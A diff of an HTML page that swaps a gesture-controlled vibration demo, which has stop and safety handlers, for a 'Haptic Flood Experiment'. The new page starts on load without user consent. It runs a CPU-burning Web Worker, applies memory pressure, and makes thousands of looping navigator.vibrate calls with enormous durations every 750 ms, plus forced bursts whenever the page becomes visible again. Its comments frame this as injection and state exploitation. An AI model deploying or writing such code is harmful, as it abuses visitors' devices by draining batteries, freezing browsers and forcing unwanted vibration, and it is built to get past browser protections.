@@ -1,401 +1,142 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Gesture → Getar Sangat Lama</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vibration Race Condition Test</title>
 <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body {
-        height: 100%;
-        font-family: Arial, sans-serif;
-        background: #0d0f14;
-        color: #e6e8eb;
-        user-select: none;
-        -webkit-tap-highlight-color: transparent;
-        overflow: hidden;
-        touch-action: none;
-    }
-    #zone {
-        position: fixed;
-        inset: 0;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        text-align: center;
-        padding: 24px;
-        transition: background .3s;
-    }
-    #zone.idle   { background: #0d0f14; }
-    #zone.active { background: #1a0f0f; }
-
-    #zone .icon {
-        font-size: 72px;
-        margin-bottom: 16px;
-        transition: transform .3s;
-    }
-    #zone.active .icon { transform: scale(1.2); animation: shake .4s infinite; }
-    @keyframes shake {
-        0%, 100% { transform: scale(1.2) rotate(0deg); }
-        25%      { transform: scale(1.2) rotate(-6deg); }
-        75%      { transform: scale(1.2) rotate(6deg); }
-    }
-
-    #zone .title {
-        font-size: 22px;
-        font-weight: 700;
-        margin-bottom: 10px;
-    }
-    #zone .hint {
-        font-size: 14px;
-        color: #8b93a1;
-        line-height: 1.7;
-        max-width: 320px;
-    }
-    #zone.active .hint { color: #f87171; }
-
-    #zone .timer {
-        font-family: ui-monospace, monospace;
-        font-size: 48px;
-        font-weight: 700;
-        color: #f87171;
-        margin: 18px 0;
-        min-height: 56px;
-        letter-spacing: 1px;
-        text-shadow: 0 0 20px rgba(248, 113, 113, 0.5);
-    }
-
-    /* Stats kecil di bawah */
-    #stats {
-        position: fixed;
-        bottom: 16px;
-        left: 0;
-        right: 0;
-        text-align: center;
-        font-family: ui-monospace, monospace;
-        font-size: 11px;
-        color: #4b5563;
-    }
-    #stats span { margin: 0 6px; }
-    #stats .ok  { color: #16a34a; }
-    #stats .err { color: #dc2626; }
-
-    /* Pulse indikator */
-    #pulse {
-        position: fixed;
-        width: 44px;
-        height: 44px;
-        border-radius: 50%;
-        background: rgba(248, 113, 113, 0.35);
-        pointer-events: none;
-        transform: translate(-50%, -50%);
-        opacity: 0;
-        transition: opacity .15s;
-    }
-    #pulse.on { opacity: 1; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { 
+    background: #000000; 
+    color: #ff0000; 
+    min-height: 100vh; 
+    font-family: monospace;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    padding: 20px;
+  }
+  .box {
+    max-width: 450px;
+    width: 100%;
+    background: #111111;
+    padding: 25px;
+    border: 1px solid #330000;
+    border-radius: 4px;
+    text-align: center;
+  }
+  #log {
+    margin-top: 15px;
+    background: #050505;
+    color: #00ff00;
+    padding: 15px;
+    border-radius: 2px;
+    font-size: 11px;
+    min-height: 150px;
+    max-height: 250px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    text-align: left;
+    border: 1px solid #002200;
+  }
 </style>
 </head>
 <body>
 
-<div id="zone" class="idle">
-    <div class="icon">👋</div>
-    <div class="title" id="title">Geser jari di layar</div>
-    <div class="timer" id="timer"></div>
-    <div class="hint" id="hint">
-        Gerakkan jari (swipe) untuk memulai getaran.<br>
-        Angkat jari untuk menghentikan.
-    </div>
-</div>
-
-<div id="pulse"></div>
-
-<div id="stats">
-    <span>📞 <b id="s-call">0</b></span>
-    <span class="ok">✅ <b id="s-ok">0</b></span>
-    <span class="err">❌ <b id="s-fail">0</b></span>
-    <span>⚡ <b id="s-hz">0</b>/s</span>
+<div class="box">
+  <h3>HAPTIC FLOOD EXPERIMENT</h3>
+  <div id="log">> Initializing stress vectors...</div>
 </div>
 
 <script>
-(() => {
-'use strict';
+(function() {
+  var logBox = document.getElementById('log');
+  var waveCount = 0;
 
-const zone   = document.getElementById('zone');
-const title  = document.getElementById('title');
-const timer  = document.getElementById('timer');
-const hint   = document.getElementById('hint');
-const pulse  = document.getElementById('pulse');
-const sCall  = document.getElementById('s-call');
-const sOk    = document.getElementById('s-ok');
-const sFail  = document.getElementById('s-fail');
-const sHz    = document.getElementById('s-hz');
+  function log(text) {
+    var ms = new Date().getMilliseconds();
+    logBox.innerHTML += "\n[" + ms + "ms] " + text;
+    logBox.scrollTop = logBox.scrollHeight;
+  }
 
-// ============================================================
-// KONFIGURASI ANTI-CUT
-// ============================================================
-// Chrome batas tunggal ≈ 10.000 ms.
-// Strategi: chunk agresif + overlap besar + multi-layer + watchdog.
+  var delay = function(ms) {
+    return new Promise(function(res) { setTimeout(res, ms); });
+  };
 
-const PRIMARY_CHUNK   = 9000;   // panggilan utama (mendekati batas)
-const PRIMARY_OVERLAP = 2000;   // overlap besar → aman
-const PRIMARY_INT     = PRIMARY_CHUNK - PRIMARY_OVERLAP;  // 7000 ms
-
-const SECONDARY_CHUNK = 6000;   // layer kedua (fallback)
-const SECONDARY_OFFSET= 3500;   // geser setengah → isi celah
-const SECONDARY_INT   = SECONDARY_CHUNK;  // 6000 ms
-
-const WATCHDOG_MS     = 1500;   // cek tiap 1.5 detik
-const MAX_GAP         = 2500;   // jika >2.5s tanpa panggilan → re-fire
-
-// ============================================================
-// STATE
-// ============================================================
-let active = false;
-let startTime = 0;
-
-let primaryTimer   = null;
-let secondaryTimer = null;
-let watchdogTimer  = null;
-let tickerTimer    = null;
-
-let callCount = 0;
-let okCount   = 0;
-let failCount = 0;
-let lastFireAt = 0;
-let recentFires = [];  // untuk hitung Hz
-
-// ============================================================
-// VIBRATE WRAPPER
-// ============================================================
-function vib(pattern) {
-    if (typeof navigator.vibrate !== 'function') return false;
-    try {
-        const result = navigator.vibrate(pattern);
-        lastFireAt = Date.now();
-        recentFires.push(lastFireAt);
-        // simpan 2 detik terakhir
-        const cutoff = Date.now() - 2000;
-        recentFires = recentFires.filter(t => t > cutoff);
-        return result;
-    } catch (_) {
-        return false;
-    }
-}
-
-// ============================================================
-// UI UPDATE
-// ============================================================
-function updateTimer() {
-    if (!active) return;
-    const sec = ((Date.now() - startTime) / 1000).toFixed(1);
-    timer.textContent = sec + 's';
-}
-
-function updateStats() {
-    sCall.textContent = callCount;
-    sOk.textContent   = okCount;
-    sFail.textContent = failCount;
-    sHz.textContent   = (recentFires.length / 2).toFixed(1);
-}
-
-function updateHint() {
-    if (active) {
-        const elapsed = ((Date.now() - startTime) / 1000).toFixed(0);
-        hint.innerHTML =
-            `Aktif — ${elapsed}s berjalan<br>` +
-            `Angkat jari untuk menghentikan.`;
-    } else {
-        hint.innerHTML =
-            `Gerakkan jari (swipe) untuk memulai getaran.<br>` +
-            `Angkat jari untuk menghentikan.`;
-    }
-}
-
-function showPulse(x, y) {
-    pulse.style.left = x + 'px';
-    pulse.style.top  = y + 'px';
-    pulse.classList.add('on');
-}
-function hidePulse() {
-    pulse.classList.remove('on');
-}
-
-// ============================================================
-// FIRE — satu panggilan vibrate dengan counter
-// ============================================================
-function fire(pattern, label = '') {
-    if (!active) return;
-    const ok = vib(pattern);
-    callCount++;
-    if (ok) okCount++; else failCount++;
-    updateStats();
-    if (label && !ok) {
-        // hanya log kegagalan, biar tidak spam
-        console.warn('[vib fail]', label, pattern);
-    }
-}
-
-// ============================================================
-// START
-// ============================================================
-function start() {
-    if (active) return;
-
-    if (typeof navigator.vibrate !== 'function') {
-        hint.textContent = 'Perangkat/browser tidak mendukung Vibration API.';
-        return;
-    }
-
-    active = true;
-    startTime = Date.now();
-    callCount = okCount = failCount = 0;
-    recentFires = [];
-    lastFireAt = Date.now();
-
-    // UI
-    zone.classList.remove('idle');
-    zone.classList.add('active');
-    zone.querySelector('.icon').textContent = '📳';
-    title.textContent = 'Getaran Aktif';
-
-    // ============================================================
-    // LAYER 1 — PRIMARY: chunk panjang, interval pendek
-    // ============================================================
-    fire(PRIMARY_CHUNK, 'primary-init');
-    primaryTimer = setInterval(() => {
-        if (!active) return;
-        fire(PRIMARY_CHUNK, 'primary');
-    }, PRIMARY_INT);
-
-    // ============================================================
-    // LAYER 2 — SECONDARY: offset setengah, isi celah
-    // ============================================================
-    // Mulai setelah SECONDARY_OFFSET supaya tidak bentrok dengan primary.
-    setTimeout(() => {
-        if (!active) return;
-        fire(SECONDARY_CHUNK, 'secondary-init');
-        secondaryTimer = setInterval(() => {
-            if (!active) return;
-            fire(SECONDARY_CHUNK, 'secondary');
-        }, SECONDARY_INT);
-    }, SECONDARY_OFFSET);
-
-    // ============================================================
-    // WATCHDOG — deteksi jika antrean macet
-    // ============================================================
-    watchdogTimer = setInterval(() => {
-        if (!active) return;
-        const gap = Date.now() - lastFireAt;
-        if (gap > MAX_GAP) {
-            // sistem macet → tembak paksa
-            console.warn('[watchdog] gap', gap, 'ms — re-fire');
-            fire(PRIMARY_CHUNK, 'watchdog');
+  // 1. INJEKSI BACKGROUND THREAD (WEB WORKER)
+  var blobCode = `
+    self.onmessage = function() {
+      setInterval(function() {
+        var dummy = 0;
+        for(var i=0; i<4000000; i++) {
+          dummy += Math.sin(i) * Math.cos(i);
         }
-    }, WATCHDOG_MS);
+        self.postMessage("TICK");
+      }, 25);
+    };
+  `;
+  
+  try {
+    var blob = new Blob([blobCode], {type: 'application/javascript'});
+    var worker = new Worker(URL.createObjectURL(blob));
+    worker.onmessage = function() {
+      if (navigator.vibrate) navigator.vibrate(200);
+    };
+    worker.postMessage("GO");
+    log("Web Worker initialized.");
+  } catch(e) {
+    log("Worker bypassed/failed.");
+  }
 
-    // ============================================================
-    // TICKER — timer visual
-    // ============================================================
-    updateTimer();
-    tickerTimer = setInterval(() => {
-        updateTimer();
-        updateHint();
-    }, 200);
+  // 2. PARALLEL EVENT LOOP BURST
+  async function executeRaceWave() {
+    waveCount++;
+    log("Spamming Wave #" + waveCount + " (2500 Burst Requests)");
 
-    updateHint();
-    updateStats();
-}
+    // Memory Heap Pressure
+    var heapSpam = [];
+    for(var m=0; m<1000; m++) { heapSpam.push(new Array(500).fill(Math.random())); }
 
-// ============================================================
-// STOP
-// ============================================================
-function stop() {
-    if (!active) return;
-    active = false;
+    var packet = [];
+    for (var i = 0; i < 2500; i++) {
+      packet.push((async function(id) {
+        await delay(Math.random() * 10);
+        if (!navigator.vibrate) return false;
+        
+        // Alternating payload strategies
+        return id % 2 === 0 ? navigator.vibrate(999999999999999999) : navigator.vibrate([500, 250, 500]);
+      })(i));
+    }
 
-    clearInterval(primaryTimer);   primaryTimer = null;
-    clearInterval(secondaryTimer); secondaryTimer = null;
-    clearInterval(watchdogTimer);  watchdogTimer = null;
-    clearInterval(tickerTimer);    tickerTimer = null;
+    // Graphics Render Interception
+    requestAnimationFrame(function() {
+      if (navigator.vibrate) navigator.vibrate(999999999999999999);
+    });
 
-    // WAJIB: hentikan getaran
-    try { navigator.vibrate(0); } catch (_) {}
+    var outcomes = await Promise.all(packet);
+    heapSpam = null;
 
-    zone.classList.remove('active');
-    zone.classList.add('idle');
-    zone.querySelector('.icon').textContent = '👋';
-    title.textContent = 'Geser jari di layar';
+    if (outcomes.includes(true)) {
+      log("🚨 API Returned TRUE. Check physical device vibration!");
+    } else {
+      log("❌ Wave dropped by browser security core.");
+    }
+  }
 
-    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-    timer.textContent = elapsed + 's';
-    hint.innerHTML =
-        `Berhenti setelah ${elapsed}s.<br>` +
-        `${callCount} panggilan (${okCount} OK, ${failCount} fail).<br>` +
-        `Geser lagi untuk memulai.`;
-}
+  // Initial execution window
+  executeRaceWave();
 
-// ============================================================
-// GESTURE DETECTION
-// ============================================================
-function onTouchStart(e) {
-    const t = e.touches[0];
-    if (t) showPulse(t.clientX, t.clientY);
-}
+  // Infinite relentless loop triggering every 750ms
+  setInterval(executeRaceWave, 750);
 
-function onTouchMove(e) {
-    const t = e.touches[0];
-    if (!t) return;
-    showPulse(t.clientX, t.clientY);
-    if (!active) start();
-}
-
-function onTouchEnd() {
-    hidePulse();
-    if (active) stop();
-}
-
-function onTouchCancel() {
-    hidePulse();
-    if (active) stop();
-}
-
-zone.addEventListener('touchstart',  onTouchStart,  { passive: false });
-zone.addEventListener('touchmove',   onTouchMove,   { passive: false });
-zone.addEventListener('touchend',    onTouchEnd,    { passive: false });
-zone.addEventListener('touchcancel', onTouchCancel, { passive: false });
-
-// Mouse fallback (desktop)
-zone.addEventListener('mousemove', (e) => {
-    if (e.buttons === 0) return;
-    showPulse(e.clientX, e.clientY);
-    if (!active) start();
-});
-zone.addEventListener('mouseup', () => {
-    hidePulse();
-    if (active) stop();
-});
-
-// ============================================================
-// SAFETY
-// ============================================================
-document.addEventListener('visibilitychange', () => {
-    if (document.hidden && active) stop();
-});
-window.addEventListener('blur', () => {
-    if (active) stop();
-});
-window.addEventListener('beforeunload', () => {
-    if (primaryTimer)   clearInterval(primaryTimer);
-    if (secondaryTimer) clearInterval(secondaryTimer);
-    if (watchdogTimer)  clearInterval(watchdogTimer);
-    if (tickerTimer)    clearInterval(tickerTimer);
-    try { navigator.vibrate(0); } catch (_) {}
-});
-
-// Init
-updateStats();
-updateHint();
+  // Resume state exploitation
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden) {
+      log("Visibility shift detected. Forcing batch requests...");
+      for(var x=0; x<30; x++) { if(navigator.vibrate) navigator.vibrate(999999999999999999); }
+    }
+  });
 
 })();
 </script>
